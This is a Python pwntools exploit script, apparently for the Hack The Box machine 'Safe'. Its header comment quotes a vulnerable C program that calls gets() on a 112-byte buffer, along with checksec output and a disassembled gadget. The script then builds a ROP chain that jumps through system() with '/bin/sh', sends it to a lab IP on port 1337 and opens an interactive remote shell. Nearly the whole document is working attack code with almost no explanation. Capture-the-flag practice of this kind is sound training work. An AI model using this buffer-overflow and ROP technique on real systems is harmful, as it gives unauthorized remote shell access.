#!/usr/bin/python3

from pwn import *

"""
int main(void){
    
  char readFromUser [112];
  
  system("/usr/bin/uptime");
  printf("\nWhat do you want me to echo back? ");
  gets(readFromUser);
  puts(readFromUser);
  return 0;
}

gef➤  checksec
[+] checksec for '/home/arthur/Reversing/HTBMachines/Safe/content/myapp'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
gef➤  

**************************************************************
*                          FUNCTION                          *
**************************************************************
undefined test()
undefined         AL:1           <RETURN>
test                                            XREF[3]:     Entry Point(*), 00402060, 
00402108(*)  

00401152 55              PUSH       RBP
00401153 48 89 e5        MOV        RBP,RSP
00401156 48 89 e7        MOV        RDI,RSP
00401159 41 ff e5        JMP        R13
0040115c 90              ??         90h
0040115d 5d              ??         5Dh    ]
0040115e c3              ??         C3h


"""

context(terminal=["tmux", "new-window"])
context(os="linux", arch="amd64")
conn = remote("10.10.10.147", 1337)
offset = 112
cmd = b"/bin/sh\x00"


pattern = b'A'*offset



test = p64(0x401152)
system = p64(0x401040)
pop_r13 = p64(0x401206)
null_byte = p64(0x0)
pop_rdi = p64(0x40120b)


pattern += cmd
pattern += pop_r13
pattern += system
pattern += null_byte
pattern += null_byte
pattern += test

conn.sendline(pattern)
conn.interactive()